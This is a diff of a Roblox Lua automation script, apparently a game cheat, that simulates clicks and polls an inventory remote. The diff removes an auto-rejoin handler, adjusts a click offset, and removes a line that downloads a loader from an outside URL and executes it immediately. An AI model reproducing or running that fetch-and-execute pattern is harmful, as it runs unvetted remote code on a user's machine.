@@ -7,19 +7,6 @@ local VirtualInputManager = game:GetService("VirtualInputManager")
 local TeleportService = game:GetService("TeleportService")
 local gameID = 17017769292
 local player = Players.LocalPlayer
-local Mouse = player:GetMouse()
-local promptOverlay = CoreGui:FindFirstChild("RobloxPromptGui") and CoreGui.RobloxPromptGui:FindFirstChild("promptOverlay")
-local connection
-
-if promptOverlay then
-    connection = promptOverlay.ChildAdded:Connect(function(child)
-        if child.Name == "ErrorPrompt" and child:FindFirstChild("MessageArea") and child.MessageArea:FindFirstChild("ErrorFrame") then
-            TeleportService:Teleport(gameID)
-            connection:Disconnect()
-        end
-    end)
-end
-
 local function ClickAtPosition(x, y)
     VirtualInputManager:SendMouseButtonEvent(x, y, 0, true, game, 1)
     wait(0.2)
@@ -203,7 +190,7 @@ spawn(function()
             local absPos = button.AbsolutePosition
             local absSize = button.AbsoluteSize
             local x, y = absPos.X, absPos.Y
-            local centerX, centerY = x + absSize.X / 2 - 20, y + absSize.Y / 2 + 30
+            local centerX, centerY = x + absSize.X / 2 , y + absSize.Y / 2 + 45
 
             ClickAtPosition(centerX, centerY)
             ui.Visible = originalUIVisibility
@@ -214,8 +201,6 @@ else
 end
 
     end
-
-    loadstring(game:HttpGet("https://nousigi.com/loader.lua"))()
 
     while true do
         local success, value = pcall(function() return getInventoryRemote:InvokeServer() end)
